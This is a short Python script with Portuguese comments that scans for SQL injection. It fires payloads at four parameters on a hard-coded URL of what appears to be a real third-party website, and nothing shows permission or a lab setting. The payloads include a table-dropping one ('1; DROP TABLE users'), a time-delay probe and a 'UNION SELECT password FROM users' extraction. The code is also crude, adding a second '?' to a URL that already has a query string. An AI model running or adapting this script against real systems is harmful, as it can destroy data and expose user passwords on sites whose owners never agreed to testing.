import requests
import urllib.parse

# Lista de parâmetros a serem testados
params = ['id', 'name', 'email', 'password']

# Lista de palavras-chave que indicam uma vulnerabilidade de injeção de SQL
vuln_keywords = ['Error', 'SQL', 'MySQL']

# Função para testar uma única entrada do parâmetro
def test_param(url, param, value):
    # Codifica o valor do parâmetro para uso na URL
    payload = {param: value}
    encoded_payload = urllib.parse.urlencode(payload)

    # Faz a solicitação GET com o valor do parâmetro codificado
    r = requests.get(url + '?' + encoded_payload)

    # Verifica se a resposta contém palavras-chave de vulnerabilidade
    for keyword in vuln_keywords:
        if keyword in r.text:
            # Se a palavra-chave for encontrada, exibe a vulnerabilidade
            print(f'Vulnerabilidade de injeção de SQL encontrada no parâmetro "{param}" com valor "{value}"')
            break

# Função para testar todos os valores do parâmetro
def test_all_values(url, param):
    # Lista de valores para testar
    values = ["' OR '1'='1", "1; DROP TABLE users", "' or sleep(5) or '", "' UNION SELECT password FROM users;"]
    
    # Testa cada valor do parâmetro
    for value in values:
        test_param(url, param, value)

# Função principal
def main():
    # URL do aplicativo a ser testado
    url = 'http://www.justrightheight.com/mobile/?nats=MTAwMjE1MS4yLjI1LjE3Ny4wLjAuMC4wLjA'

    # Testa todos os parâmetros da lista
    for param in params:
        test_all_values(url, param)

# Executa a função principal
if __name__ == '__main__':
    main()